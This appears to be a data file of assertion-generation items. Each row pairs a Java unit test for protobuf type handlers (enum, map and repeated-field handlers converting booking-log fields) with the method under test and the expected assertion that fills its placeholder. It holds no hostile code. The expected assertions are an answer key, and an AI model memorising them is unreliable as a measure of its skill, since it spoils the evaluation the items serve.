"shouldReturnEnumHandlerIfEnumFieldDescriptorPassed() { Descriptors.FieldDescriptor enumFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""service_type""); TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(enumFieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeHandler(final Descriptors.FieldDescriptor fieldDescriptor) { int newHashCode = fieldDescriptor.hashCode();  /* this means we have already created and persisted the handler corresponding to the field descriptor in the map and hence we can directly return it */ if (typeHandlerMap.containsKey(fieldDescriptor.getFullName()) && typeHandlerMap.get(fieldDescriptor.getFullName()).getKey() == newHashCode) { Pair<Integer, TypeHandler> pair = typeHandlerMap.get(fieldDescriptor.getFullName()); return pair.getValue(); } else { /* this means that either it is a new field not encountered before and/or same field but with an updated field descriptor object in either case, we create a new handler and persist it in the map */ TypeHandler handler = getSpecificHandlers(fieldDescriptor) .stream() .filter(TypeHandler::canHandle) .findFirst() .orElseGet(() -> new PrimitiveTypeHandler(fieldDescriptor)); Pair<Integer, TypeHandler> pair = ImmutablePair.of(newHashCode, handler); typeHandlerMap.put(fieldDescriptor.getFullName(), pair); return handler; } }"	assertEquals(EnumHandler.class, typeHandler.getClass())
"shouldReturnRepeatedHandlerIfRepeatedFieldDescriptorPassed() { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array""); TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(repeatedFieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeHandler(final Descriptors.FieldDescriptor fieldDescriptor) { int newHashCode = fieldDescriptor.hashCode();  /* this means we have already created and persisted the handler corresponding to the field descriptor in the map and hence we can directly return it */ if (typeHandlerMap.containsKey(fieldDescriptor.getFullName()) && typeHandlerMap.get(fieldDescriptor.getFullName()).getKey() == newHashCode) { Pair<Integer, TypeHandler> pair = typeHandlerMap.get(fieldDescriptor.getFullName()); return pair.getValue(); } else { /* this means that either it is a new field not encountered before and/or same field but with an updated field descriptor object in either case, we create a new handler and persist it in the map */ TypeHandler handler = getSpecificHandlers(fieldDescriptor) .stream() .filter(TypeHandler::canHandle) .findFirst() .orElseGet(() -> new PrimitiveTypeHandler(fieldDescriptor)); Pair<Integer, TypeHandler> pair = ImmutablePair.of(newHashCode, handler); typeHandlerMap.put(fieldDescriptor.getFullName(), pair); return handler; } }"	assertEquals(RepeatedPrimitiveHandler.class, typeHandler.getClass())
"shouldReturnRepeatedMessageHandlerIfRepeatedMessageFieldDescriptorPassed() { Descriptors.FieldDescriptor repeatedMessageFieldDescriptor = TestFeedbackLogMessage.getDescriptor().findFieldByName(""reason""); TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(repeatedMessageFieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeHandler(final Descriptors.FieldDescriptor fieldDescriptor) { int newHashCode = fieldDescriptor.hashCode();  /* this means we have already created and persisted the handler corresponding to the field descriptor in the map and hence we can directly return it */ if (typeHandlerMap.containsKey(fieldDescriptor.getFullName()) && typeHandlerMap.get(fieldDescriptor.getFullName()).getKey() == newHashCode) { Pair<Integer, TypeHandler> pair = typeHandlerMap.get(fieldDescriptor.getFullName()); return pair.getValue(); } else { /* this means that either it is a new field not encountered before and/or same field but with an updated field descriptor object in either case, we create a new handler and persist it in the map */ TypeHandler handler = getSpecificHandlers(fieldDescriptor) .stream() .filter(TypeHandler::canHandle) .findFirst() .orElseGet(() -> new PrimitiveTypeHandler(fieldDescriptor)); Pair<Integer, TypeHandler> pair = ImmutablePair.of(newHashCode, handler); typeHandlerMap.put(fieldDescriptor.getFullName(), pair); return handler; } }"	assertEquals(RepeatedMessageHandler.class, typeHandler.getClass())
"shouldReturnRepeatedEnumHandlerIfRepeatedEnumFieldDescriptorPassed() { Descriptors.FieldDescriptor repeatedEnumFieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(repeatedEnumFieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeHandler(final Descriptors.FieldDescriptor fieldDescriptor) { int newHashCode = fieldDescriptor.hashCode();  /* this means we have already created and persisted the handler corresponding to the field descriptor in the map and hence we can directly return it */ if (typeHandlerMap.containsKey(fieldDescriptor.getFullName()) && typeHandlerMap.get(fieldDescriptor.getFullName()).getKey() == newHashCode) { Pair<Integer, TypeHandler> pair = typeHandlerMap.get(fieldDescriptor.getFullName()); return pair.getValue(); } else { /* this means that either it is a new field not encountered before and/or same field but with an updated field descriptor object in either case, we create a new handler and persist it in the map */ TypeHandler handler = getSpecificHandlers(fieldDescriptor) .stream() .filter(TypeHandler::canHandle) .findFirst() .orElseGet(() -> new PrimitiveTypeHandler(fieldDescriptor)); Pair<Integer, TypeHandler> pair = ImmutablePair.of(newHashCode, handler); typeHandlerMap.put(fieldDescriptor.getFullName(), pair); return handler; } }"	assertEquals(RepeatedEnumHandler.class, typeHandler.getClass())
"shouldReturnRepeatedStructHandlerIfRepeatedStructFieldDescriptorPassed() { Descriptors.FieldDescriptor repeatedStructFieldDescriptor = TestNestedRepeatedMessage.getDescriptor().findFieldByName(""metadata""); TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(repeatedStructFieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeHandler(final Descriptors.FieldDescriptor fieldDescriptor) { int newHashCode = fieldDescriptor.hashCode();  /* this means we have already created and persisted the handler corresponding to the field descriptor in the map and hence we can directly return it */ if (typeHandlerMap.containsKey(fieldDescriptor.getFullName()) && typeHandlerMap.get(fieldDescriptor.getFullName()).getKey() == newHashCode) { Pair<Integer, TypeHandler> pair = typeHandlerMap.get(fieldDescriptor.getFullName()); return pair.getValue(); } else { /* this means that either it is a new field not encountered before and/or same field but with an updated field descriptor object in either case, we create a new handler and persist it in the map */ TypeHandler handler = getSpecificHandlers(fieldDescriptor) .stream() .filter(TypeHandler::canHandle) .findFirst() .orElseGet(() -> new PrimitiveTypeHandler(fieldDescriptor)); Pair<Integer, TypeHandler> pair = ImmutablePair.of(newHashCode, handler); typeHandlerMap.put(fieldDescriptor.getFullName(), pair); return handler; } }"	assertEquals(RepeatedStructMessageHandler.class, typeHandler.getClass())
"shouldReturnStructHandlerIfStructFieldDescriptorPassed() { Descriptors.FieldDescriptor structFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""profile_data""); TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(structFieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeHandler(final Descriptors.FieldDescriptor fieldDescriptor) { int newHashCode = fieldDescriptor.hashCode();  /* this means we have already created and persisted the handler corresponding to the field descriptor in the map and hence we can directly return it */ if (typeHandlerMap.containsKey(fieldDescriptor.getFullName()) && typeHandlerMap.get(fieldDescriptor.getFullName()).getKey() == newHashCode) { Pair<Integer, TypeHandler> pair = typeHandlerMap.get(fieldDescriptor.getFullName()); return pair.getValue(); } else { /* this means that either it is a new field not encountered before and/or same field but with an updated field descriptor object in either case, we create a new handler and persist it in the map */ TypeHandler handler = getSpecificHandlers(fieldDescriptor) .stream() .filter(TypeHandler::canHandle) .findFirst() .orElseGet(() -> new PrimitiveTypeHandler(fieldDescriptor)); Pair<Integer, TypeHandler> pair = ImmutablePair.of(newHashCode, handler); typeHandlerMap.put(fieldDescriptor.getFullName(), pair); return handler; } }"	assertEquals(StructMessageHandler.class, typeHandler.getClass())
"shouldReturnMessageHandlerIfMessageFieldDescriptorPassed() { Descriptors.FieldDescriptor messageFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""payment_option_metadata""); TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(messageFieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeHandler(final Descriptors.FieldDescriptor fieldDescriptor) { int newHashCode = fieldDescriptor.hashCode();  /* this means we have already created and persisted the handler corresponding to the field descriptor in the map and hence we can directly return it */ if (typeHandlerMap.containsKey(fieldDescriptor.getFullName()) && typeHandlerMap.get(fieldDescriptor.getFullName()).getKey() == newHashCode) { Pair<Integer, TypeHandler> pair = typeHandlerMap.get(fieldDescriptor.getFullName()); return pair.getValue(); } else { /* this means that either it is a new field not encountered before and/or same field but with an updated field descriptor object in either case, we create a new handler and persist it in the map */ TypeHandler handler = getSpecificHandlers(fieldDescriptor) .stream() .filter(TypeHandler::canHandle) .findFirst() .orElseGet(() -> new PrimitiveTypeHandler(fieldDescriptor)); Pair<Integer, TypeHandler> pair = ImmutablePair.of(newHashCode, handler); typeHandlerMap.put(fieldDescriptor.getFullName(), pair); return handler; } }"	assertEquals(MessageHandler.class, typeHandler.getClass())
"shouldReturnDefaultHandlerIfPrimitiveFieldDescriptorPassed() { Descriptors.FieldDescriptor primitiveFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(primitiveFieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeHandler(final Descriptors.FieldDescriptor fieldDescriptor) { int newHashCode = fieldDescriptor.hashCode();  /* this means we have already created and persisted the handler corresponding to the field descriptor in the map and hence we can directly return it */ if (typeHandlerMap.containsKey(fieldDescriptor.getFullName()) && typeHandlerMap.get(fieldDescriptor.getFullName()).getKey() == newHashCode) { Pair<Integer, TypeHandler> pair = typeHandlerMap.get(fieldDescriptor.getFullName()); return pair.getValue(); } else { /* this means that either it is a new field not encountered before and/or same field but with an updated field descriptor object in either case, we create a new handler and persist it in the map */ TypeHandler handler = getSpecificHandlers(fieldDescriptor) .stream() .filter(TypeHandler::canHandle) .findFirst() .orElseGet(() -> new PrimitiveTypeHandler(fieldDescriptor)); Pair<Integer, TypeHandler> pair = ImmutablePair.of(newHashCode, handler); typeHandlerMap.put(fieldDescriptor.getFullName(), pair); return handler; } }"	assertEquals(PrimitiveTypeHandler.class, typeHandler.getClass())
"shouldReturnTrueIfEnumFieldDescriptorIsPassed() { Descriptors.FieldDescriptor enumFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""service_type""); EnumHandler enumHandler = new EnumHandler(enumFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.ENUM && !fieldDescriptor.isRepeated(); }"	assertTrue(enumHandler.canHandle())
"shouldReturnFalseIfRepeatedEnumFieldDescriptorIsPassed() { Descriptors.FieldDescriptor repeatedEnumFieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); EnumHandler enumHandler = new EnumHandler(repeatedEnumFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.ENUM && !fieldDescriptor.isRepeated(); }"	assertFalse(enumHandler.canHandle())
"shouldReturnFalseIfFieldDescriptorOtherThanEnumTypeIsPassed() { Descriptors.FieldDescriptor otherFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); EnumHandler enumHandler = new EnumHandler(otherFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.ENUM && !fieldDescriptor.isRepeated(); }"	assertFalse(enumHandler.canHandle())
"shouldReturnTheSameBuilderWithoutSettingIfNullPassed() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); EnumHandler enumHandler = new EnumHandler(fieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(fieldDescriptor.getContainingType());  ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { if (!canHandle() || field == null) { return builder; } String stringValue = String.valueOf(field).trim(); Descriptors.EnumValueDescriptor valueByName = fieldDescriptor.getEnumType().findValueByName(stringValue); if (valueByName == null) { throw new EnumFieldNotFoundException(""field: "" + stringValue + "" not found in "" + fieldDescriptor.getFullName()); } return builder.setField(fieldDescriptor, valueByName); }"	"assertEquals("""", enumHandler.transformToProtoBuilder(builder, null).getField(fieldDescriptor))"
"shouldSetTheFieldPassedInTheBuilderForEnumFieldTypeDescriptor() { Descriptors.FieldDescriptor enumFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""service_type""); EnumHandler enumHandler = new EnumHandler(enumFieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(enumFieldDescriptor.getContainingType());  DynamicMessage.Builder returnedBuilder = enumHandler.transformToProtoBuilder(builder, ""GO_RIDE""); ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { if (!canHandle() || field == null) { return builder; } String stringValue = String.valueOf(field).trim(); Descriptors.EnumValueDescriptor valueByName = fieldDescriptor.getEnumType().findValueByName(stringValue); if (valueByName == null) { throw new EnumFieldNotFoundException(""field: "" + stringValue + "" not found in "" + fieldDescriptor.getFullName()); } return builder.setField(fieldDescriptor, valueByName); }"	assertEquals(TestServiceType.Enum.GO_RIDE.getValueDescriptor(), returnedBuilder.getField(enumFieldDescriptor))
"shouldReturnEnumStringGivenEnumStringForFieldDescriptorOfTypeEnum() { String inputField = ""DRIVER_FOUND"";  Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""status"");  Object value = TypeHandlerFactory.getTypeHandler(fieldDescriptor).transformFromPostProcessor(inputField);  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { String input = field != null ? field.toString() : ""0""; try { int enumPosition = Integer.parseInt(input); Descriptors.EnumValueDescriptor valueByNumber = fieldDescriptor.getEnumType().findValueByNumber(enumPosition); return valueByNumber != null ? valueByNumber.getName() : fieldDescriptor.getEnumType().findValueByNumber(0).getName(); } catch (NumberFormatException e) { Descriptors.EnumValueDescriptor valueByName = fieldDescriptor.getEnumType().findValueByName(input); return valueByName != null ? valueByName.getName() : fieldDescriptor.getEnumType().findValueByNumber(0).getName(); } }"	"assertEquals(""DRIVER_FOUND"", value)"
"shouldReturnDefaultEnumStringIfNotFoundForFieldDescriptorOfTypeEnum() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""status"");  Object value = TypeHandlerFactory.getTypeHandler(fieldDescriptor).transformFromPostProcessor(null);  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { String input = field != null ? field.toString() : ""0""; try { int enumPosition = Integer.parseInt(input); Descriptors.EnumValueDescriptor valueByNumber = fieldDescriptor.getEnumType().findValueByNumber(enumPosition); return valueByNumber != null ? valueByNumber.getName() : fieldDescriptor.getEnumType().findValueByNumber(0).getName(); } catch (NumberFormatException e) { Descriptors.EnumValueDescriptor valueByName = fieldDescriptor.getEnumType().findValueByName(input); return valueByName != null ? valueByName.getName() : fieldDescriptor.getEnumType().findValueByNumber(0).getName(); } }"	"assertEquals(""UNKNOWN"", value)"
"shouldReturnDefaultEnumStringIfInputIsAEnumPositionAndNotInTheProtoDefinitionForFieldDescriptorOfTypeEnum() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""status"");  Object value = TypeHandlerFactory.getTypeHandler(fieldDescriptor).transformFromPostProcessor(-1);  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { String input = field != null ? field.toString() : ""0""; try { int enumPosition = Integer.parseInt(input); Descriptors.EnumValueDescriptor valueByNumber = fieldDescriptor.getEnumType().findValueByNumber(enumPosition); return valueByNumber != null ? valueByNumber.getName() : fieldDescriptor.getEnumType().findValueByNumber(0).getName(); } catch (NumberFormatException e) { Descriptors.EnumValueDescriptor valueByName = fieldDescriptor.getEnumType().findValueByName(input); return valueByName != null ? valueByName.getName() : fieldDescriptor.getEnumType().findValueByNumber(0).getName(); } }"	"assertEquals(""UNKNOWN"", value)"
"shouldReturnDefaultEnumStringIfInputIsAStringAndNotInTheProtoDefinitionForFieldDescriptorOfTypeEnum() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""status"");  Object value = TypeHandlerFactory.getTypeHandler(fieldDescriptor).transformFromPostProcessor(""dummy"");  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { String input = field != null ? field.toString() : ""0""; try { int enumPosition = Integer.parseInt(input); Descriptors.EnumValueDescriptor valueByNumber = fieldDescriptor.getEnumType().findValueByNumber(enumPosition); return valueByNumber != null ? valueByNumber.getName() : fieldDescriptor.getEnumType().findValueByNumber(0).getName(); } catch (NumberFormatException e) { Descriptors.EnumValueDescriptor valueByName = fieldDescriptor.getEnumType().findValueByName(input); return valueByName != null ? valueByName.getName() : fieldDescriptor.getEnumType().findValueByNumber(0).getName(); } }"	"assertEquals(""UNKNOWN"", value)"
"shouldReturnDefaultEnumStringIfInputIsNullForFieldDescriptorOfTypeEnum() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""status"");  Object value = TypeHandlerFactory.getTypeHandler(fieldDescriptor).transformFromPostProcessor(null);  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { String input = field != null ? field.toString() : ""0""; try { int enumPosition = Integer.parseInt(input); Descriptors.EnumValueDescriptor valueByNumber = fieldDescriptor.getEnumType().findValueByNumber(enumPosition); return valueByNumber != null ? valueByNumber.getName() : fieldDescriptor.getEnumType().findValueByNumber(0).getName(); } catch (NumberFormatException e) { Descriptors.EnumValueDescriptor valueByName = fieldDescriptor.getEnumType().findValueByName(input); return valueByName != null ? valueByName.getName() : fieldDescriptor.getEnumType().findValueByNumber(0).getName(); } }"	"assertEquals(""UNKNOWN"", value)"
"shouldReturnEnumStringGivenEnumPositionForFieldDescriptorOfTypeEnum() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""status"");  Object value = TypeHandlerFactory.getTypeHandler(fieldDescriptor).transformFromPostProcessor(2);  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { String input = field != null ? field.toString() : ""0""; try { int enumPosition = Integer.parseInt(input); Descriptors.EnumValueDescriptor valueByNumber = fieldDescriptor.getEnumType().findValueByNumber(enumPosition); return valueByNumber != null ? valueByNumber.getName() : fieldDescriptor.getEnumType().findValueByNumber(0).getName(); } catch (NumberFormatException e) { Descriptors.EnumValueDescriptor valueByName = fieldDescriptor.getEnumType().findValueByName(input); return valueByName != null ? valueByName.getName() : fieldDescriptor.getEnumType().findValueByNumber(0).getName(); } }"	"assertEquals(""DRIVER_FOUND"", value)"
"shouldReturnTypeInformation() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""status""); EnumHandler enumHandler = new EnumHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeInformation() { return Types.STRING; }"	assertEquals(Types.STRING, enumHandler.getTypeInformation())
"shouldConvertEnumToJsonString() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""status""); Object value = new EnumHandler(fieldDescriptor).transformToJson(""DRIVER_FOUND"");  ""<AssertPlaceHolder>""; }
transformToJson(Object field) { return field; }"	"assertEquals(""DRIVER_FOUND"", value)"
"shouldReturnStringEnumValueWhenSimpleGroupIsPassed() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""status""); String expectedEnum = fieldDescriptor.getEnumType().getValues().get(1).getName(); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(BINARY).named(""status"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""status"", expectedEnum); EnumHandler enumHandler = new EnumHandler(fieldDescriptor);  Object actualEnum = enumHandler.transformFromParquet(simpleGroup);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String defaultEnumValue = fieldDescriptor.getEnumType().findValueByNumber(0).getName(); String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { String parquetEnumValue = simpleGroup.getString(fieldName, 0); Descriptors.EnumValueDescriptor enumValueDescriptor = fieldDescriptor.getEnumType().findValueByName(parquetEnumValue); return enumValueDescriptor == null ? defaultEnumValue : enumValueDescriptor.getName(); } return defaultEnumValue; }"	assertEquals(expectedEnum, actualEnum)
"shouldReturnDefaultEnumStringWhenNullIsPassedToTransformFromParquet() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""status""); EnumHandler enumHandler = new EnumHandler(fieldDescriptor);  Object actualEnumValue = enumHandler.transformFromParquet(null);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String defaultEnumValue = fieldDescriptor.getEnumType().findValueByNumber(0).getName(); String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { String parquetEnumValue = simpleGroup.getString(fieldName, 0); Descriptors.EnumValueDescriptor enumValueDescriptor = fieldDescriptor.getEnumType().findValueByName(parquetEnumValue); return enumValueDescriptor == null ? defaultEnumValue : enumValueDescriptor.getName(); } return defaultEnumValue; }"	"assertEquals(""UNKNOWN"", actualEnumValue)"
"shouldReturnDefaultEnumStringWhenEnumValueInsideSimpleGroupIsNotPresentInProtoDefinition() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""status""); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(BINARY).named(""status"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""status"", ""NON_EXISTENT_ENUM""); EnumHandler enumHandler = new EnumHandler(fieldDescriptor);  Object actualEnum = enumHandler.transformFromParquet(simpleGroup);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String defaultEnumValue = fieldDescriptor.getEnumType().findValueByNumber(0).getName(); String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { String parquetEnumValue = simpleGroup.getString(fieldName, 0); Descriptors.EnumValueDescriptor enumValueDescriptor = fieldDescriptor.getEnumType().findValueByName(parquetEnumValue); return enumValueDescriptor == null ? defaultEnumValue : enumValueDescriptor.getName(); } return defaultEnumValue; }"	"assertEquals(""UNKNOWN"", actualEnum)"
"shouldReturnTrueIfMapFieldDescriptorIsPassed() { Descriptors.FieldDescriptor mapFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.isMapField(); }"	assertTrue(mapHandler.canHandle())
"shouldReturnFalseIfFieldDescriptorOtherThanMapTypeIsPassed() { Descriptors.FieldDescriptor otherFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); MapHandler mapHandler = new MapHandler(otherFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.isMapField(); }"	assertFalse(mapHandler.canHandle())
"shouldReturnSameBuilderWithoutSettingFieldIfCannotHandle() { Descriptors.FieldDescriptor otherFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); MapHandler mapHandler = new MapHandler(otherFieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(otherFieldDescriptor.getContainingType());  DynamicMessage.Builder returnedBuilder = mapHandler.transformToProtoBuilder(builder, ""123""); ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { if (!canHandle() || field == null) { return builder; } if (field instanceof Map) { Map<?, ?> mapField = (Map<?, ?>) field; ArrayList<Row> rows = new ArrayList<>(); for (Entry<?, ?> entry : mapField.entrySet()) { rows.add(Row.of(entry.getKey(), entry.getValue())); } return repeatedMessageHandler.transformToProtoBuilder(builder, rows.toArray()); } return repeatedMessageHandler.transformToProtoBuilder(builder, field); }"	"assertEquals("""", returnedBuilder.getField(otherFieldDescriptor))"
"shouldReturnSameBuilderWithoutSettingFieldIfNullPassed() { Descriptors.FieldDescriptor mapFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(mapFieldDescriptor.getContainingType());  DynamicMessage.Builder returnedBuilder = mapHandler.transformToProtoBuilder(builder, null); List<DynamicMessage> entries = (List<DynamicMessage>) returnedBuilder.getField(mapFieldDescriptor); ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { if (!canHandle() || field == null) { return builder; } if (field instanceof Map) { Map<?, ?> mapField = (Map<?, ?>) field; ArrayList<Row> rows = new ArrayList<>(); for (Entry<?, ?> entry : mapField.entrySet()) { rows.add(Row.of(entry.getKey(), entry.getValue())); } return repeatedMessageHandler.transformToProtoBuilder(builder, rows.toArray()); } return repeatedMessageHandler.transformToProtoBuilder(builder, field); }"	assertEquals(0, entries.size())
"shouldReturnArrayOfRowHavingSameSizeAsInputMapForTransformForPostProcessor() { Descriptors.FieldDescriptor mapFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); HashMap<String, String> inputMap = new HashMap<>(); inputMap.put(""a"", ""123""); inputMap.put(""b"", ""456"");  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromPostProcessor(inputMap));  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { ArrayList<Row> rows = new ArrayList<>(); if (field == null) { return rows.toArray(); } if (field instanceof Map) { Map<String, ?> mapField = (Map<String, ?>) field; for (Entry<String, ?> entry : mapField.entrySet()) { Descriptors.FieldDescriptor keyDescriptor = fieldDescriptor.getMessageType().findFieldByName(""key""); Descriptors.FieldDescriptor valueDescriptor = fieldDescriptor.getMessageType().findFieldByName(""value""); TypeHandler handler = TypeHandlerFactory.getTypeHandler(keyDescriptor); Object key = handler.transformFromPostProcessor(entry.getKey()); Object value = TypeHandlerFactory.getTypeHandler(valueDescriptor).transformFromPostProcessor(entry.getValue()); rows.add(Row.of(key, value)); } return rows.toArray(); } if (field instanceof List) { return repeatedMessageHandler.transformFromPostProcessor(field); } return rows.toArray(); }"	assertEquals(2, outputValues.size())
"shouldReturnEmptyArrayOfRowIfNullPassedForTransformForPostProcessor() { Descriptors.FieldDescriptor mapFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromPostProcessor(null));  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { ArrayList<Row> rows = new ArrayList<>(); if (field == null) { return rows.toArray(); } if (field instanceof Map) { Map<String, ?> mapField = (Map<String, ?>) field; for (Entry<String, ?> entry : mapField.entrySet()) { Descriptors.FieldDescriptor keyDescriptor = fieldDescriptor.getMessageType().findFieldByName(""key""); Descriptors.FieldDescriptor valueDescriptor = fieldDescriptor.getMessageType().findFieldByName(""value""); TypeHandler handler = TypeHandlerFactory.getTypeHandler(keyDescriptor); Object key = handler.transformFromPostProcessor(entry.getKey()); Object value = TypeHandlerFactory.getTypeHandler(valueDescriptor).transformFromPostProcessor(entry.getValue()); rows.add(Row.of(key, value)); } return rows.toArray(); } if (field instanceof List) { return repeatedMessageHandler.transformFromPostProcessor(field); } return rows.toArray(); }"	assertEquals(0, outputValues.size())
"InvalidProtocolBufferException { Descriptors.FieldDescriptor mapFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); MapEntry<String, String> mapEntry = MapEntry .newDefaultInstance(mapFieldDescriptor.getMessageType(), WireFormat.FieldType.STRING, """", WireFormat.FieldType.STRING, """"); TestBookingLogMessage driverProfileFlattenLogMessage = TestBookingLogMessage .newBuilder() .addRepeatedField(mapFieldDescriptor, mapEntry.toBuilder().setKey(""a"").setValue(""123"").buildPartial()) .addRepeatedField(mapFieldDescriptor, mapEntry.toBuilder().setKey(""b"").setValue(""456"").buildPartial()) .build();  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestBookingLogMessage.getDescriptor(), driverProfileFlattenLogMessage.toByteArray());  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromProto(dynamicMessage.getField(mapFieldDescriptor)));  ""<AssertPlaceHolder>""; }
transformFromProto(Object field) { return repeatedMessageHandler.transformFromProto(field); }"	assertEquals(2, outputValues.size())
